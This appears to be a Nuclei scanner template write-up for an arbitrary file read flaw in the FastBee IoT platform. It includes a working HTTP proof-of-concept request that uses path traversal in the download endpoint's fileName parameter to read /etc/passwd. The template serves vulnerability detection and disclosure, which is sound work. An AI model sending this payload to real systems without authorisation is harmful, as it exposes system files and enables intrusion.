# Nuclei Template: FastBee - Local File Inclusion
**Template ID:** fastbee-arbitrary-file-read
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`fastbee-arbitrary-file-read.yaml`)

## Vulnerability Information & PoC

## Description
Arbitrary file read vulnerability exists in FastBee IoT platform download, which may lead to sensitive information leakage, data theft and other security risks, thus causing serious harm to the system and users.

## Steps to reproduce / Exploit Payload
```http
GET / HTTP/1.1
Host: {{Hostname}}

GET /prod-api/iot/tool/download?fileName=/../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
```

## References
- https://blog.csdn.net/weixin_43167326/article/details/141806542
